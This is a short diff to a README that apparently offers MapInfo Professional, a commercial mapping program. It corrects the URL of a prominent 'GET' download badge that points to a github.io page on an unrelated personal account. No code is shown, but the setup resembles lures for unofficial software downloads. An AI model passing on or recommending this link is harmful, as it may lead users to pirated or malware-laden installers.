@@ -33,7 +33,7 @@ Students, freelancers, home users, and small teams can all use MapInfo Professio
 
 ## Requirements for MapInfo Professional
 
-[![GET MapInfo Professional](https://img.shields.io/badge/GET%20%E2%80%94%20MapInfo%20Professional-0078D6?style=for-the-badge&logoColor=white)](https://mauritsevertsn544638.github.io/.github/MapInfo Professional)
+[![GET MapInfo Professional](https://img.shields.io/badge/GET%20%E2%80%94%20MapInfo%20Professional-0078D6?style=for-the-badge&logoColor=white)](https://mauritsevertsn544638.github.io/.github/MapInfo-Professional)
 | | Minimum | Recommended |
 |-|---------|--------------|
 | OS | Windows 10 | Windows 11 |
